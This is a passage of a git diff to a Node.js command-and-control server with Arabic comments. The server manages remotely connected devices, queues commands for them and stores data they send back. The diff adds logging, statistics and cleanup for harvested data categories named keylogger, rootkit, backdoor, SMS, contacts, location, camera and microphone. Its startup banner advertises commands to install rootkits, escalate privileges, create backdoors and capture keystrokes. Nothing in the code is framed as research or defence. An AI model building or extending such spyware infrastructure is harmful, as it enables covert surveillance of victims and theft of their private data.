+      console.log(`  📅 آخر ظهور: ${device.lastSeen.toLocaleString()}`);
+      console.log(`  📊 الحالة: ${device.status}`);
     }
   }
 
   handleActivationConfirmation(message) {
     const { data } = message;
     this.saveActivationData(data);
+    
+    console.log(`✅ تأكيد تفعيل الجهاز: ${data.deviceId}`);
+    console.log(`  📅 وقت التفعيل: ${new Date().toLocaleString()}`);
+    console.log(`  📊 الحالة: ${data.status || 'active'}`);
     
     // إرسال الأوامر المعلقة
     if (data.deviceId) {
@@ -577,12 +1529,16 @@ class CommandServer {
 
   handlePendingCommandResult(message) {
     const { command, timestamp } = message;
-    console.log('نتيجة أمر معلق:', command);
+    console.log('📨 نتيجة أمر معلق:', command);
+    console.log(`  📅 الوقت: ${new Date(timestamp).toLocaleString()}`);
+    console.log(`  📊 الحالة: ${command.status || 'completed'}`);
   }
 
   handleCachedData(message) {
     const { key, data, timestamp } = message;
-    console.log('بيانات مخزنة محلياً:', key);
+    console.log('💾 بيانات مخزنة محلياً:', key);
+    console.log(`  📅 الوقت: ${new Date(timestamp).toLocaleString()}`);
+    console.log(`  📏 حجم البيانات: ${JSON.stringify(data).length} bytes`);
     
     // حفظ البيانات المخزنة
     this.saveCachedData(key, data);
@@ -595,7 +1551,9 @@ class CommandServer {
       device.ws = null;
       this.updateDeviceStatus(deviceId, 'offline');
       
-      console.log(`انقطع الاتصال بالجهاز: ${deviceId}`);
+      console.log(`❌ انقطع الاتصال بالجهاز: ${deviceId}`);
+      console.log(`  📊 الحالة الجديدة: offline`);
+      console.log(`  📅 وقت الانقطاع: ${new Date().toLocaleString()}`);
     }
   }
 
@@ -624,7 +1582,7 @@ class CommandServer {
     const pendingCommands = this.pendingCommands.get(deviceId) || [];
     
     if (pendingCommands.length > 0) {
-      console.log(`إرسال ${pendingCommands.length} أمر معلق للجهاز ${deviceId}`);
+      console.log(`📨 إرسال ${pendingCommands.length} أمر معلق للجهاز ${deviceId}`);
       
       pendingCommands.forEach(command => {
         try {
@@ -638,26 +1596,34 @@ class CommandServer {
           command.attempts++;
           
           if (command.attempts >= 3) {
-            console.log(`تم تجاوز الحد الأقصى للمحاولات للأمر: ${command.command}`);
+            console.log(`⚠️ تم تجاوز الحد الأقصى للمحاولات للأمر: ${command.command}`);
             this.removePendingCommand(deviceId, command.id);
           }
         } catch (error) {
-          console.error('خطأ في إرسال الأمر المعلق:', error);
+          console.error('❌ خطأ في إرسال الأمر المعلق:', error);
         }
       });
       
       // مسح الأوامر المرسلة بنجاح
       this.pendingCommands.set(deviceId, []);
+      console.log(`✅ تم إرسال جميع الأوامر المعلقة للجهاز ${deviceId}`);
     }
   }
 
   processPendingCommands() {
+    let processedCount = 0;
+    
     this.pendingCommands.forEach((commands, deviceId) => {
       const device = this.devices.get(deviceId);
       if (device && device.ws && device.status === 'online') {
         this.sendPendingCommands(deviceId);
+        processedCount += commands.length;
       }
     });
+    
+    if (processedCount > 0) {
+      console.log(`📨 تم معالجة ${processedCount} أمر معلق`);
+    }
   }
 
   generateCommandId() {
@@ -795,9 +1761,107 @@ class CommandServer {
       // حفظ البيانات
       fs.writeFileSync(this.dataFilePath, JSON.stringify(this.dataUpdates, null, 2));
       
-      console.log('تم حفظ البيانات المحلية');
+      // حفظ إحصائيات الأوامر المتقدمة
+      this.saveAdvancedStats();
+      
+      console.log('💾 تم حفظ البيانات المحلية');
+      console.log(`  📱 الأجهزة: ${this.devices.size}`);
+      console.log(`  📨 الأوامر المعلقة: ${this.pendingCommands.size}`);
+      console.log(`  📁 الملفات: ${this.uploadedFiles.length}`);
+      console.log(`  📊 التحديثات: ${this.dataUpdates.length}`);
     } catch (error) {
       console.error('خطأ في حفظ البيانات المحلية:', error);
+    }
+  }
+
+  // حفظ إحصائيات الأوامر المتقدمة
+  saveAdvancedStats() {
+    try {
+      const statsPath = path.join(this.localStoragePath, 'advanced-stats.json');
+      const stats = {
+        timestamp: Date.now(),
+        totalCommands: this.commandHistory.length,
+        totalDevices: this.devices.size,
+        totalFiles: this.uploadedFiles.length,
+        totalDataUpdates: this.dataUpdates.length
+      };
+      
+      fs.writeFileSync(statsPath, JSON.stringify(stats, null, 2));
+      console.log('📊 تم حفظ الإحصائيات المتقدمة');
+    } catch (error) {
+      console.error('❌ خطأ في حفظ الإحصائيات المتقدمة:', error);
+    }
+  }
+
+  // تحميل إحصائيات الأوامر المتقدمة
+  loadAdvancedStats() {
+    try {
+      const statsPath = path.join(this.localStoragePath, 'advanced-stats.json');
+      if (fs.existsSync(statsPath)) {
+        const stats = JSON.parse(fs.readFileSync(statsPath, 'utf8'));
+        console.log('📊 تم تحميل الإحصائيات المتقدمة');
+        console.log(`  📨 إجمالي الأوامر: ${stats.totalCommands || 0}`);
+        console.log(`  📱 إجمالي الأجهزة: ${stats.totalDevices || 0}`);
+        console.log(`  📁 إجمالي الملفات: ${stats.totalFiles || 0}`);
+        console.log(`  📊 إجمالي التحديثات: ${stats.totalDataUpdates || 0}`);
+      } else {
+        console.log('📊 لا توجد إحصائيات متقدمة محفوظة');
+      }
+    } catch (error) {
+      console.error('❌ خطأ في تحميل الإحصائيات المتقدمة:', error);
+    }
+  }
+
+  // الحصول على إحصائيات الأوامر المتقدمة
+  getAdvancedCommandStats() {
+    try {
+      const logsPath = path.join(this.localStoragePath, 'advanced-logs');
+      const dataPath = path.join(this.localStoragePath, 'advanced-data');
+      
+      const stats = {
+        totalLogs: 0,
+        totalData: 0,
+        types: {}
+      };
+      
+      const types = [
+        'keylogger', 'rootkit', 'backdoor', 'system', 'screenshot',
+        'contacts', 'sms', 'media', 'location', 'camera', 'microphone',
+        'file', 'network', 'process', 'registry', 'memory', 'encryption'
+      ];
+      
+      // حساب السجلات
+      if (fs.existsSync(logsPath)) {
+        types.forEach(type => {
+          const logFile = path.join(logsPath, `${type}-logs.json`);
+          if (fs.existsSync(logFile)) {
+            const logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
+            stats.totalLogs += logs.length;
+            stats.types[type] = { logs: logs.length, data: 0 };
+          }
+        });
+      }
+      
+      // حساب البيانات
+      if (fs.existsSync(dataPath)) {
+        types.forEach(type => {
+          const dataFile = path.join(dataPath, `${type}-data.json`);
+          if (fs.existsSync(dataFile)) {
+            const data = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
+            stats.totalData += data.length;
+            if (stats.types[type]) {
+              stats.types[type].data = data.length;
+            } else {
+              stats.types[type] = { logs: 0, data: data.length };
+            }
+          }
+        });
+      }
+      
+      return stats;
+    } catch (error) {
+      console.error('خطأ في الحصول على إحصائيات الأوامر المتقدمة:', error);
+      return { totalLogs: 0, totalData: 0, types: {} };
     }
   }
 
@@ -821,9 +1885,67 @@ class CommandServer {
         now - new Date(file.uploadDate).getTime() < sevenDays
       );
       
-      console.log('تم تنظيف البيانات القديمة');
+      // تنظيف السجلات المتقدمة
+      this.cleanupAdvancedLogs(sevenDays);
+      
+      console.log('🧹 تم تنظيف البيانات القديمة');
+      console.log(`  📨 الأوامر: ${this.commandHistory.length}`);
+      console.log(`  📊 التحديثات: ${this.dataUpdates.length}`);
+      console.log(`  📁 الملفات: ${this.uploadedFiles.length}`);
     } catch (error) {
       console.error('خطأ في تنظيف البيانات القديمة:', error);
+    }
+  }
+
+  // تنظيف السجلات المتقدمة
+  cleanupAdvancedLogs(ageThreshold) {
+    try {
+      const now = Date.now();
+      const logsPath = path.join(this.localStoragePath, 'advanced-logs');
+      const dataPath = path.join(this.localStoragePath, 'advanced-data');
+      
+      const types = [
+        'keylogger', 'rootkit', 'backdoor', 'system', 'screenshot',
+        'contacts', 'sms', 'media', 'location', 'camera', 'microphone',
+        'file', 'network', 'process', 'registry', 'memory', 'encryption'
+      ];
+      
+      // تنظيف السجلات
+      if (fs.existsSync(logsPath)) {
+        types.forEach(type => {
+          const logFile = path.join(logsPath, `${type}-logs.json`);
+          if (fs.existsSync(logFile)) {
+            const logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
+            const filteredLogs = logs.filter(log => 
+              now - log.timestamp < ageThreshold
+            );
+            fs.writeFileSync(logFile, JSON.stringify(filteredLogs, null, 2));
+          }
+        });
+      }
+      
+      // تنظيف البيانات
+      if (fs.existsSync(dataPath)) {
+        types.forEach(type => {
+          const dataFile = path.join(dataPath, `${type}-data.json`);
+          if (fs.existsSync(dataFile)) {
+            const data = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
+            const filteredData = data.filter(item => 
+              now - item.timestamp < ageThreshold
+            );
+            fs.writeFileSync(dataFile, JSON.stringify(filteredData, null, 2));
+          }
+        });
+      }
+      
+      console.log('📋 تم تنظيف السجلات المتقدمة');
+      console.log('  🔑 Keylogger, 🔧 Rootkit, 🚪 Backdoor');
+      console.log('  💻 System, 📸 Screenshot, 📱 Contacts');
+      console.log('  💬 SMS, 📍 Location, 📷 Camera, 🎤 Microphone');
+      console.log('  📁 File, 🌐 Network, 💉 Process, 🔧 Registry');
+      console.log('  🧠 Memory, 🔓 Encryption');
+    } catch (error) {
+      console.error('خطأ في تنظيف السجلات المتقدمة:', error);
     }
   }
 
@@ -831,15 +1953,21 @@ class CommandServer {
     try {
       const now = Date.now();
       const inactiveThreshold = 30 * 60 * 1000; // 30 دقيقة
+      let inactiveCount = 0;
       
       this.devices.forEach((device, deviceId) => {
         if (device.lastSeen && (now - device.lastSeen.getTime() > inactiveThreshold)) {
           device.status = 'inactive';
           this.updateDeviceStatus(deviceId, 'inactive');
+          inactiveCount++;
         }
       });
+      
+      if (inactiveCount > 0) {
+        console.log(`🔍 تم تحديث ${inactiveCount} جهاز إلى حالة غير نشط`);
+      }
     } catch (error) {
-      console.error('خطأ في تنظيف الأجهزة غير النشطة:', error);
+      console.error('❌ خطأ في تنظيف الأجهزة غير النشطة:', error);
     }
   }
 
@@ -855,13 +1983,50 @@ class CommandServer {
       console.log('✅ تم تهيئة النظام بنجاح');
       console.log('🔒 وضع الأمان مفعل');
       console.log('💾 التخزين المحلي مفعل');
+      console.log('🔧 الأوامر المتقدمة مفعلة');
+      console.log('📊 نظام السجلات المتقدم جاهز');
+      console.log('🛠️ الخدمات الخلفية تعمل');
       console.log('🌐 جاهز لاستقبال الطلبات');
+      console.log('');
+      console.log('📋 الأوامر المتقدمة المدعومة:');
+      console.log('  🔑 Keylogger: start, stop, get_data');
+      console.log('  🔧 Rootkit: install, escalate, hide');
+      console.log('  🚪 Backdoor: create, execute, transfer');
+      console.log('  💻 System: info, control, monitor');
+      console.log('  📸 Screenshot, 📱 Contacts, 💬 SMS');
+      console.log('  📍 Location, 📷 Camera, 🎤 Microphone');
+      console.log('  📁 File, 🌐 Network, 💉 Process');
+      console.log('  🔧 Registry, 🧠 Memory, 🔓 Encryption');
+      console.log('');
     });
   }
 }
 
-// إنشاء وتشغيل الخادم
-const commandServer = new CommandServer();
-commandServer.start(process.env.PORT || 10001);
+// دعم Cluster لتحسين الأداء
+if (cluster.isMaster) {
+  console.log(`🚀 بدء النظام مع ${numCPUs} عملية`);
+  console.log(`📊 عدد المعالجات: ${numCPUs}`);
+  console.log(`🔧 وضع Cluster مفعل`);
+  
+  // إنشاء العمليات الفرعية
+  for (let i = 0; i < numCPUs; i++) {
+    cluster.fork();
+  }
+  
+  cluster.on('exit', (worker, code, signal) => {
+    console.log(`❌ العملية ${worker.process.pid} توقفت`);
+    console.log(`🔄 إعادة تشغيل العملية...`);
+    cluster.fork();
+  });
+  
+  cluster.on('online', (worker) => {
+    console.log(`✅ العملية ${worker.process.pid} تعمل`);
+  });
+  
+} else {
+  // إنشاء وتشغيل الخادم في العملية الفرعية
+  const commandServer = new CommandServer();
+  commandServer.start(process.env.PORT || 10001);
+}
 
 module.exports = CommandServer;
